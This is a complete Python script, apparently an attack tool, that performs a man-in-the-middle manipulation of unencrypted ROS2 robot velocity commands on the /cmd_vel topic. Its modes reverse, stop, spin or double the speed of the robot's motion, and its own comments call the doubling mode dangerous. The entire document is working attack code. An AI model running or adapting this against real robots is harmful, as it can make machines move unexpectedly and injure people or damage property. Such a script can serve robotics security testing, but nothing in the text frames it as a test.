#!/usr/bin/env python3
"""
MITM Message Modification Script
Intercepts and modifies ROS2 messages (works only with unencrypted ROS2)
"""

import rclpy
from rclpy.node import Node
from geometry_msgs.msg import TwistStamped
import sys
import time

class MITMMessageModifier(Node):
    """Intercepts /cmd_vel messages, modifies them, and republishes"""
    
    def __init__(self):
        super().__init__('mitm_modifier')
        
        # Subscribe to original /cmd_vel
        self.subscription = self.create_subscription(
            TwistStamped,
            '/cmd_vel',
            self.intercept_callback,
            10
        )
        
        # Publish modified messages
        self.publisher = self.create_publisher(
            TwistStamped,
            '/cmd_vel',
            10
        )
        
        self.modification_enabled = False
        self.modification_type = 'none'
        
        self.get_logger().warn('MITM Message Modifier started')
        self.get_logger().warn('Intercepting /cmd_vel messages...')
    
    def intercept_callback(self, msg):
        """Intercept incoming message and modify if enabled"""
        if self.modification_enabled:
            original_linear = msg.twist.linear.x
            original_angular = msg.twist.angular.z
            
            # Modify message based on attack type
            if self.modification_type == 'reverse':
                # Reverse direction
                msg.twist.linear.x = -msg.twist.linear.x
                msg.twist.angular.z = -msg.twist.angular.z
                self.get_logger().warn(
                    f'MODIFIED: linear {original_linear} -> {msg.twist.linear.x}, '
                    f'angular {original_angular} -> {msg.twist.angular.z}'
                )
            elif self.modification_type == 'stop':
                # Stop robot
                msg.twist.linear.x = 0.0
                msg.twist.angular.z = 0.0
                self.get_logger().warn(f'MODIFIED: Stopped robot (was linear={original_linear})')
            elif self.modification_type == 'spin':
                # Make robot spin
                msg.twist.linear.x = 0.0
                msg.twist.angular.z = 2.0
                self.get_logger().warn(f'MODIFIED: Forced spin (was linear={original_linear})')
            elif self.modification_type == 'amplify':
                # Amplify commands (dangerous)
                msg.twist.linear.x *= 2.0
                msg.twist.angular.z *= 2.0
                self.get_logger().warn(
                    f'MODIFIED: Amplified commands (linear {original_linear} -> {msg.twist.linear.x})'
                )
        
        # Republish (modified or original)
        self.publisher.publish(msg)
    
    def enable_modification(self, mod_type='reverse'):
        """Enable message modification"""
        self.modification_enabled = True
        self.modification_type = mod_type
        self.get_logger().warn(f'⚠️  Message modification ENABLED: {mod_type}')
        self.get_logger().warn('All /cmd_vel messages will be modified!')
    
    def disable_modification(self):
        """Disable message modification"""
        self.modification_enabled = False
        self.get_logger().info('Message modification disabled')


def main():
    rclpy.init()
    
    modifier = MITMMessageModifier()
    
    if len(sys.argv) > 1:
        mod_type = sys.argv[1]
        if mod_type in ['reverse', 'stop', 'spin', 'amplify']:
            modifier.enable_modification(mod_type)
        else:
            print(f"Unknown modification type: {mod_type}")
            print("Available types: reverse, stop, spin, amplify")
    else:
        print("MITM Message Modifier")
        print("Usage: python3 modify_ros2_messages.py [modification_type]")
        print("")
        print("Modification types:")
        print("  reverse  - Reverse all commands (forward -> backward)")
        print("  stop     - Stop robot (set all to zero)")
        print("  spin     - Force robot to spin")
        print("  amplify  - Amplify commands (2x speed)")
        print("")
        print("If no type specified, runs in intercept-only mode (no modification)")
        print("")
    
    try:
        rclpy.spin(modifier)
    except KeyboardInterrupt:
        print("\nStopping MITM modifier...")
    finally:
        modifier.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()

